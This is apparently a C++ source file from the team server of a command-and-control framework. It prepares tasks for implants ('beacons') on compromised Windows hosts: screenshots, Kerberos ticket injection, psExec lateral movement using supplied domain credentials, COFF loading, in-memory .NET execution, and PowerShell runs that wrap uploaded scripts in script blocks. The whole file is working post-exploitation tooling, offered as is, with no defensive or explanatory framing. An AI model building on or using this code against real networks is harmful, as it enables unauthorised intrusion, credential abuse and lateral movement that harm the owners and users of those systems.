#include "TeamServerModuleArtifactCommandPreparer.hpp"

#include <algorithm>
#include <cctype>
#include <filesystem>
#include <sstream>
#include <utility>

#include "modules/ModuleCmd/Common.hpp"

namespace fs = std::filesystem;

namespace
{
constexpr const char* DotnetLoadCommand = "00001";
constexpr const char* PwShLoadCommand = "00001";
constexpr const char* PwShRunCommand = "00003";
constexpr const char* PwShImportCommand = "00004";
constexpr const char* PwShScriptCommand = "00005";
constexpr const char* FixedPwShRunner = "rdm.dll";
constexpr const char* FixedPwShType = "rdm.rdm";

std::string toLower(std::string value)
{
    std::transform(value.begin(), value.end(), value.begin(), [](unsigned char c)
    {
        return static_cast<char>(std::tolower(c));
    });
    return value;
}

std::vector<std::string> regroup(const std::vector<std::string>& tokens)
{
    return regroupStrings(tokens);
}

std::string joinTail(const std::vector<std::string>& tokens, std::size_t start, bool trailingSpace = false)
{
    std::ostringstream output;
    for (std::size_t index = start; index < tokens.size(); ++index)
    {
        if (index != start)
            output << ' ';
        output << tokens[index];
    }
    if (trailingSpace && start < tokens.size())
        output << ' ';
    return output.str();
}

std::string extensionLower(const std::string& path)
{
    return toLower(fs::path(path).extension().string());
}

bool endsWithDll(const std::string& path)
{
    return extensionLower(path) == ".dll";
}

bool endsWithExe(const std::string& path)
{
    return extensionLower(path) == ".exe";
}

TeamServerCommandPreparerResult handledError(C2Message& c2Message, const std::string& message)
{
    TeamServerCommandPreparerResult result;
    result.handled = true;
    result.status = -1;
    c2Message.set_returnvalue(message);
    return result;
}

TeamServerCommandPreparerResult unhandled()
{
    return {};
}
} // namespace

TeamServerModuleArtifactCommandPreparer::TeamServerModuleArtifactCommandPreparer(
    std::shared_ptr<spdlog::logger> logger,
    std::shared_ptr<TeamServerFileArtifactService> fileArtifactService,
    std::vector<std::unique_ptr<ModuleCmd>>& moduleCmd)
    : m_logger(std::move(logger)),
      m_fileArtifactService(std::move(fileArtifactService)),
      m_moduleCmd(moduleCmd)
{
}

bool TeamServerModuleArtifactCommandPreparer::canPrepare(const std::string& instruction) const
{
    const std::string lowered = toLower(instruction);
    return lowered == "screenshot"
        || lowered == "kerberosuseticket"
        || lowered == "psexec"
        || lowered == "coffloader"
        || lowered == "dotnetexec"
        || lowered == "pwsh";
}

TeamServerCommandPreparerResult TeamServerModuleArtifactCommandPreparer::prepare(
    const TeamServerCommandPreparerContext& context,
    C2Message& c2Message) const
{
    const std::string instruction = toLower(context.tokens.empty() ? "" : context.tokens[0]);
    if (instruction == "screenshot")
        return prepareScreenShot(context, c2Message);
    if (instruction == "kerberosuseticket")
        return prepareKerberosUseTicket(context, c2Message);
    if (instruction == "psexec")
        return preparePsExec(context, c2Message);
    if (instruction == "coffloader")
        return prepareCoffLoader(context, c2Message);
    if (instruction == "dotnetexec")
        return prepareDotnetExec(context, c2Message);
    if (instruction == "pwsh")
        return preparePwSh(context, c2Message);
    return unhandled();
}

bool TeamServerModuleArtifactCommandPreparer::hasModule(const std::string& name) const
{
    const std::string lowered = toLower(name);
    for (const auto& module : m_moduleCmd)
    {
        if (module && toLower(module->getName()) == lowered)
            return true;
    }
    return false;
}

TeamServerPreparedInputArtifact TeamServerModuleArtifactCommandPreparer::resolveToolOrUpload(
    const std::string& selector,
    const TeamServerCommandPreparerContext& context,
    std::string& errorMessage) const
{
    TeamServerPreparedInputArtifact tool = m_fileArtifactService->resolveToolArtifact(
        selector,
        context.isWindows,
        context.windowsArch);
    if (tool.ok)
        return tool;

    TeamServerPreparedInputArtifact upload = m_fileArtifactService->resolveUploadArtifact(
        selector,
        context.isWindows,
        context.windowsArch);
    if (upload.ok)
        return upload;

    errorMessage = tool.message + "\n" + upload.message;
    return {};
}

TeamServerCommandPreparerResult TeamServerModuleArtifactCommandPreparer::prepareScreenShot(
    const TeamServerCommandPreparerContext& context,
    C2Message& c2Message) const
{
    TeamServerCommandPreparerResult result;
    result.handled = true;
    result.status = -1;

    const std::vector<std::string> tokens = regroup(context.tokens);
    if (!context.isWindows)
        return handledError(c2Message, "screenShot is Windows-only.\n");
    if (!hasModule("screenShot"))
        return handledError(c2Message, "Module screenShot not found.\n");
    if (!m_fileArtifactService)
        return handledError(c2Message, "File artifact service is not available.\n");
    if (tokens.size() > 2)
        return handledError(c2Message, "Usage: screenShot [artifact_name]\n");

    TeamServerGeneratedFileArtifactSpec spec;
    spec.remotePath = "screen";
    spec.nameHint = tokens.size() == 2 ? tokens[1] : "screenshot.bmp";
    spec.category = "screenshot";
    spec.source = "beacon";
    spec.format = "bmp";
    spec.runtime = "file";
    spec.description = "Screenshot captured from beacon host.";
    spec.tags = {"screenShot", "screenshot"};
    spec.isWindows = true;
    spec.arch = context.windowsArch;
    spec.writeResultData = true;

    TeamServerPreparedDownloadArtifact artifact = m_fileArtifactService->prepareGeneratedFileArtifact(spec);
    if (!artifact.ok)
        return handledError(c2Message, artifact.message + "\n");

    c2Message.set_instruction("screenShot");
    c2Message.set_outputfile(artifact.path);
    result.status = 0;
    if (m_logger)
        m_logger->info("Prepared screenShot artifact path {}", artifact.path);
    return result;
}

TeamServerCommandPreparerResult TeamServerModuleArtifactCommandPreparer::prepareKerberosUseTicket(
    const TeamServerCommandPreparerContext& context,
    C2Message& c2Message) const
{
    TeamServerCommandPreparerResult result;
    result.handled = true;
    result.status = -1;

    const std::vector<std::string> tokens = regroup(context.tokens);
    if (!context.isWindows)
        return handledError(c2Message, "kerberosUseTicket is Windows-only.\n");
    if (!hasModule("kerberosUseTicket"))
        return handledError(c2Message, "Module kerberosUseTicket not found.\n");
    if (!m_fileArtifactService)
        return handledError(c2Message, "File artifact service is not available.\n");
    if (tokens.size() != 2)
        return handledError(c2Message, "Usage: kerberosUseTicket <upload_artifact>\n");

    TeamServerPreparedInputArtifact artifact = m_fileArtifactService->resolveUploadArtifact(
        tokens[1],
        context.isWindows,
        context.windowsArch);
    if (!artifact.ok)
        return handledError(c2Message, artifact.message + "\n");

    c2Message.set_instruction("kerberosUseTicket");
    c2Message.set_inputfile(artifact.artifact.name);
    c2Message.set_data(artifact.bytes);
    result.status = 0;
    return result;
}

TeamServerCommandPreparerResult TeamServerModuleArtifactCommandPreparer::preparePsExec(
    const TeamServerCommandPreparerContext& context,
    C2Message& c2Message) const
{
    TeamServerCommandPreparerResult result;
    result.handled = true;
    result.status = -1;

    const std::vector<std::string> tokens = regroup(context.tokens);
    if (!context.isWindows)
        return handledError(c2Message, "psExec is Windows-only.\n");
    if (!hasModule("psExec"))
        return handledError(c2Message, "Module psExec not found.\n");
    if (!m_fileArtifactService)
        return handledError(c2Message, "File artifact service is not available.\n");
    if (tokens.size() < 2)
        return handledError(c2Message, "Usage: psExec -u <DOMAIN\\user> <password> <target> <tool_or_upload_artifact> | psExec -k|-n <target> <tool_or_upload_artifact>\n");

    std::string selector;
    std::string packedCommand;
    const std::string mode = tokens[1];
    if (mode == "-u" && tokens.size() == 6)
    {
        std::string domain = ".";
        std::string username = tokens[2];
        std::vector<std::string> userParts;
        splitList(tokens[2], "\\", userParts);
        if (userParts.size() == 1)
        {
            username = userParts[0];
        }
        else if (userParts.size() > 1)
        {
            domain = userParts[0];
            username = userParts[1];
        }

        packedCommand = domain;
        packedCommand += '\0';
        packedCommand += username;
        packedCommand += '\0';
        packedCommand += tokens[3];
        packedCommand += '\0';
        packedCommand += tokens[4];
        selector = tokens[5];
    }
    else if ((mode == "-n" || mode == "-k") && tokens.size() == 4)
    {
        packedCommand = tokens[2];
        selector = tokens[3];
    }
    else
    {
        return handledError(c2Message, "Usage: psExec -u <DOMAIN\\user> <password> <target> <tool_or_upload_artifact> | psExec -k|-n <target> <tool_or_upload_artifact>\n");
    }

    std::string errorMessage;
    TeamServerPreparedInputArtifact artifact = resolveToolOrUpload(selector, context, errorMessage);
    if (!artifact.ok)
        return handledError(c2Message, errorMessage + "\n");

    c2Message.set_instruction("psExec");
    c2Message.set_inputfile(artifact.artifact.name);
    c2Message.set_cmd(packedCommand);
    c2Message.set_data(artifact.bytes);
    result.status = 0;
    return result;
}

TeamServerCommandPreparerResult TeamServerModuleArtifactCommandPreparer::prepareCoffLoader(
    const TeamServerCommandPreparerContext& context,
    C2Message& c2Message) const
{
    TeamServerCommandPreparerResult result;
    result.handled = true;
    result.status = -1;

    const std::vector<std::string> tokens = regroup(context.tokens);
    if (!context.isWindows)
        return handledError(c2Message, "coffLoader is Windows-only.\n");
    if (!hasModule("coffLoader"))
        return handledError(c2Message, "Module coffLoader not found.\n");
    if (!m_fileArtifactService)
        return handledError(c2Message, "File artifact service is not available.\n");
    if (tokens.size() < 3)
        return handledError(c2Message, "Usage: coffLoader <tool_artifact> <function_name> [packed_arguments]\n");

    TeamServerPreparedInputArtifact artifact = m_fileArtifactService->resolveToolArtifact(
        tokens[1],
        context.isWindows,
        context.windowsArch);
    if (!artifact.ok)
        return handledError(c2Message, artifact.message + "\n");

    c2Message.set_instruction("coffLoader");
    c2Message.set_inputfile(artifact.artifact.name);
    c2Message.set_cmd(tokens[2]);
    c2Message.set_args(tokens.size() > 3 ? joinTail(tokens, 3) : "");
    c2Message.set_data(artifact.bytes);
    result.status = 0;
    return result;
}

TeamServerCommandPreparerResult TeamServerModuleArtifactCommandPreparer::prepareDotnetExec(
    const TeamServerCommandPreparerContext& context,
    C2Message& c2Message) const
{
    TeamServerCommandPreparerResult result;
    const std::vector<std::string> tokens = regroup(context.tokens);
    if (tokens.size() < 2 || tokens[1] != "load")
        return result;

    result.handled = true;
    result.status = -1;
    if (!context.isWindows)
        return handledError(c2Message, "dotnetExec is Windows-only.\n");
    if (!hasModule("dotnetExec"))
        return handledError(c2Message, "Module dotnetExec not found.\n");
    if (!m_fileArtifactService)
        return handledError(c2Message, "File artifact service is not available.\n");
    if (tokens.size() != 4 && tokens.size() != 5)
        return handledError(c2Message, "Usage: dotnetExec load <name> <tool_artifact.exe|dll> [type_for_dll]\n");

    const std::string& selector = tokens[3];
    std::string type;
    if (endsWithDll(selector) && tokens.size() == 5)
        type = tokens[4];
    else if (endsWithExe(selector) && tokens.size() == 4)
        type = "";
    else
        return handledError(c2Message, "For exe typeForDll must be empty. For dll typeForDll must specify the namespace and class.\n");

    TeamServerPreparedInputArtifact artifact = m_fileArtifactService->resolveToolArtifact(
        selector,
        context.isWindows,
        context.windowsArch);
    if (!artifact.ok)
        return handledError(c2Message, artifact.message + "\n");

    c2Message.set_instruction("dotnetExec");
    c2Message.set_inputfile(artifact.artifact.name);
    c2Message.set_cmd(DotnetLoadCommand);
    c2Message.set_args(tokens[2]);
    c2Message.set_returnvalue(type);
    c2Message.set_data(artifact.bytes);
    result.status = 0;
    return result;
}

TeamServerCommandPreparerResult TeamServerModuleArtifactCommandPreparer::preparePwSh(
    const TeamServerCommandPreparerContext& context,
    C2Message& c2Message) const
{
    TeamServerCommandPreparerResult result;
    const std::vector<std::string> tokens = regroup(context.tokens);
    if (tokens.size() < 2)
        return result;

    result.handled = true;
    result.status = -1;
    if (!context.isWindows)
        return handledError(c2Message, "pwSh is Windows-only.\n");
    if (!hasModule("pwSh"))
        return handledError(c2Message, "Module pwSh not found.\n");
    if (!m_fileArtifactService)
        return handledError(c2Message, "File artifact service is not available.\n");

    const std::string action = tokens[1];
    if (action == "init")
    {
        if (tokens.size() != 2)
            return handledError(c2Message, "Usage: pwSh init\n");

        TeamServerPreparedInputArtifact artifact = m_fileArtifactService->resolveToolArtifact(
            FixedPwShRunner,
            context.isWindows,
            context.windowsArch);
        if (!artifact.ok)
            return handledError(c2Message, artifact.message + "\n");

        c2Message.set_instruction("pwSh");
        c2Message.set_inputfile(artifact.artifact.name);
        c2Message.set_cmd(PwShLoadCommand);
        c2Message.set_args(FixedPwShType);
        c2Message.set_data(artifact.bytes);
        result.status = 0;
        return result;
    }
    if (action == "run" && tokens.size() >= 3)
    {
        c2Message.set_instruction("pwSh");
        c2Message.set_cmd(PwShRunCommand);
        c2Message.set_args(joinTail(tokens, 2, true));
        result.status = 0;
        return result;
    }
    if ((action == "import" || action == "script") && tokens.size() == 3)
    {
        TeamServerPreparedInputArtifact artifact = m_fileArtifactService->resolveScriptArtifact(
            tokens[2],
            context.isWindows,
            context.windowsArch);
        if (!artifact.ok)
            return handledError(c2Message, artifact.message + "\n");

        std::string payload;
        if (action == "import")
        {
            payload = "New-Module -ScriptBlock {\n";
            payload += artifact.bytes;
            payload += "\nExport-ModuleMember -Function * -Alias *;};";
            c2Message.set_cmd(PwShImportCommand);
        }
        else
        {
            payload = "Invoke-Command -ScriptBlock  {\n";
            payload += artifact.bytes;
            payload += "};";
            c2Message.set_cmd(PwShScriptCommand);
        }

        c2Message.set_instruction("pwSh");
        c2Message.set_inputfile(artifact.artifact.name);
        c2Message.set_args(payload);
        result.status = 0;
        return result;
    }

    return handledError(c2Message, "Usage: pwSh init | pwSh run <command> | pwSh import <script_artifact> | pwSh script <script_artifact>\n");
}
